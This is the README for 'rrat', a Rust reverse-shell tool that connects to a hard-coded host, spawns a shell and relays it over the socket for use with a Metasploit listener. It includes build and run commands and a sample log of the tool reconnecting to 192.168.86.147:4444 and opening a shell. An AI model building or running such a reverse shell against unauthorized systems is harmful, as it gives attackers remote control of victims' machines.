
# rrat

An rust CLI app that connects to a server then opens a shell and redirects stdin/stdout through the network socket.
Can be used in conjunction with the metasploit framework reverse_tcp shell listener.


## Building

Ensure rust is installed (https://www.rust-lang.org/) then run:

```bash
$ cargo build
```

The host and port are hard-coded towards the top of main.rs so you'll want to change these before building.

## Usage / running

Output is written using the `env_logger` crate so by default you won't see anything unless you set the "RUST_LOG" environment variable.

To see output while running use:

```bash
$ RUST_LOG=rrat cargo run
```

or if running an already compiled executable:

```bash
$ RUST_LOG=rrat ./rrat
```

Example output after running `rrat` then starting a meterpreter listener.

```
DEBUG 2018-01-20T14:23:38Z: rrat: Starting connect loop to '192.168.86.147:4444'
 WARN 2018-01-20T14:23:38Z: rrat: Failed to connect, waiting before retry
DEBUG 2018-01-20T14:23:40Z: rrat: Starting connect loop to '192.168.86.147:4444'
 WARN 2018-01-20T14:23:40Z: rrat: Failed to connect, waiting before retry
DEBUG 2018-01-20T14:23:42Z: rrat: Starting connect loop to '192.168.86.147:4444'
DEBUG 2018-01-20T14:23:42Z: rrat: Setting read/write timeout...
DEBUG 2018-01-20T14:23:42Z: rrat: Connected to endpoint, starting shell
DEBUG 2018-01-20T14:23:42Z: rrat: Opening shell IO
DEBUG 2018-01-20T14:23:42Z: rrat: Beginning IO read/write loops
DEBUG 2018-01-20T14:23:42Z: rrat: Waiting for threads to finish.
```

For details: https://doc.rust-lang.org/log/env_logger/index.html